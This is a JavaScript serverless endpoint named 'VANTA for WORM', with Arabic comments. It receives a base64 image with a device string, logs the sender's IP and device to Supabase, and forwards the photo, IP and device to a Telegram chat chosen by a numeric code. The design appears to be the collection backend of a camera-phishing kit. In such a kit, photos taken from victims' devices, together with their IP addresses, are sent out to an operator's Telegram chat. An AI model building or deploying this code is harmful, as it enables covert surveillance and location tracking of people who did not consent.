// api/send.js — VANTA for WORM
// يستقبل الصورة + يحفظها في Supabase + يرسلها للمستخدم

const SB_URL = process.env.SUPABASE_URL;
const SB_KEY = process.env.SUPABASE_SERVICE_KEY;

async function sb(path, method, body) {
  const r = await fetch(SB_URL + '/rest/v1/' + path, {
    method: method || 'GET',
    headers: {
      'apikey': SB_KEY,
      'Authorization': 'Bearer ' + SB_KEY,
      'Content-Type': 'application/json',
      'Prefer': 'return=representation'
    },
    body: body ? JSON.stringify(body) : undefined
  });
  try { return await r.json(); } catch (e) { return null; }
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).json({ ok: false });
    return;
  }

  const TG_TOKEN = process.env.TG_TOKEN;
  const FALLBACK = process.env.TG_CHAT;

  try {
    let body = req.body;
    if (typeof body === 'string') body = JSON.parse(body);

    const image = body && body.image;
    const device = (body && body.device) ? String(body.device).slice(0, 200) : '';
    const code = (body && body.code) ? String(body.code).trim() : '';

    const m = /^data:image\/(png|jpeg|webp);base64,([A-Za-z0-9+/=]+)$/.exec(image || '');
    if (!m) { res.status(400).json({ ok: false }); return; }

    const buf = Buffer.from(m[2], 'base64');
    const ip = ((req.headers['x-forwarded-for'] || '').split(',')[0].trim())
              || req.socket?.remoteAddress || 'unknown';

    // المستلم
    let recipient = (/^\d+$/.test(code)) ? code : FALLBACK;

    // فحص الحظر
    if (recipient) {
      const b = await sb('users?chat_id=eq.' + recipient + '&blocked=eq.true');
      if (b && b.length > 0) {
        res.status(200).json({ ok: false, blocked: true });
        return;
      }
    }

    // حفظ في Supabase
    try {
      await sb('images', 'POST', {
        chat_id: parseInt(recipient) || 0,
        device: device,
        ip: ip
      });
    } catch (e) {}

    // إرسال لتلغرام
    const caption = '📸 صورة جديدة\n📱 ' + device + '\n🌐 ' + ip;

    const boundary = '----v' + Date.now();
    const head = `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${recipient}\r\n` +
                 `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n` +
                 `--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="c.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`;
    const tail = `\r\n--${boundary}--\r\n`;
    const payload = Buffer.concat([Buffer.from(head), buf, Buffer.from(tail)]);

    const tg = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
      method: 'POST',
      headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` },
      body: payload
    });

    const out = await tg.json();
    res.status(200).json({ ok: !!out.ok });
  } catch (e) {
    res.status(500).json({ ok: false, err: String(e) });
  }
}
